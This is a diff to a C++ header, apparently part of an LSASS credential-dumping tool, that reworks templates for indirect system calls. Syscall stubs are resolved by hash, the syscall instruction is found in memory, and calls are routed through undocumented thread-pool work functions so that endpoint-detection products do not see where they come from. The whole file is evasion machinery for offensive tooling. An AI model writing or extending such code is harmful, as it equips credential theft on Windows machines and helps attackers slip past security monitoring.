@@ -7,32 +7,40 @@
 
 EXTERN_C VOID CALLBACK ProxyCaller(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
 
-struct HELPER {
+typedef struct _HELPER {
     D_TYPE(TpAllocWork)
     D_TYPE(TpPostWork)
     D_TYPE(TpReleaseWork)
-};
+} HELPER, *PHELPER;
 
-EXTERN HELPER* pHelper;
+EXTERN PHELPER pHelper;
 
-template<UINT_PTR I, DWORD S, UINT64 N>
+template<UINT64 ArgCount>
+struct SYSCALL;
+
+template<UINT64 ArgCount>
+BOOL FetchSyscallStub(_Inout_ SYSCALL<ArgCount>* pSyscall, _In_ ULONG ulSyscallHash);
+
+template<UINT64 ArgCount>
+BOOL FindSyscallInstruction(_Inout_ SYSCALL<ArgCount>* pSyscall);
+
+template<UINT64 ArgCount>
 struct SYSCALL_ARGS {
-    UINT_PTR    pSyscallInstruction = I;
-    UINT_PTR    dwSsn               = S;
-    UINT64      argCount            = N;
-    UINT_PTR    pArgs[N];
+    UINT_PTR    pSyscallInstruction;
+    DWORD       dwSsn;
+    UINT64      argCount = ArgCount;
+    UINT_PTR    pArgs[ArgCount];
 };
 
-template<UINT64 N, AUTO S>
+template<UINT64 ArgCount>
 struct SYSCALL {
     UINT_PTR    pSyscallInstruction;
-    UINT_PTR    dwSsn;
-    __typeof__(S)* Call;
+    DWORD       dwSsn;
+    SYSCALL_ARGS<ArgCount> syscallArgs;
 
-    VOID ProxyCall(UINT_PTR pArgs[N]) {
-        SYSCALL_ARGS<pSyscallInstruction, dwSsn, N> syscallArgs;
+    VOID ProxyCall(_In_ UINT_PTR pArgs[ArgCount]) {
         PTP_WORK WorkReturn = NULL;
-        syscallArgs.pArgs = pArgs;
+        memcpy(syscallArgs.pArgs, pArgs, sizeof(UINT_PTR) * ArgCount);
 
         pHelper->TpAllocWork(
                 &WorkReturn,
@@ -43,8 +51,23 @@ struct SYSCALL {
 
         pHelper->TpPostWork(WorkReturn);
         pHelper->TpReleaseWork(WorkReturn);
-        WaitForSingleObject((HANDLE)-1, 4096);
+        WaitForSingleObject(NtCurrentProcess(), 1);
+    }
+
+    BOOL Init(_Inout_ SYSCALL<ArgCount>* pSyscall, _In_ ULONG ulSyscallHash) {
+        if (!FetchSyscallStub<ArgCount>(pSyscall, ulSyscallHash)) {
+            return FALSE;
+        }
+
+        if (!FindSyscallInstruction<ArgCount>(pSyscall)) {
+            return FALSE;
+        }
+        syscallArgs.dwSsn = dwSsn;
+        syscallArgs.pSyscallInstruction = pSyscallInstruction;
+        return TRUE;
     }
 };
+
+BOOL InitSyscalls();
 
 #endif //LSASSC_PROXYCALLER_H
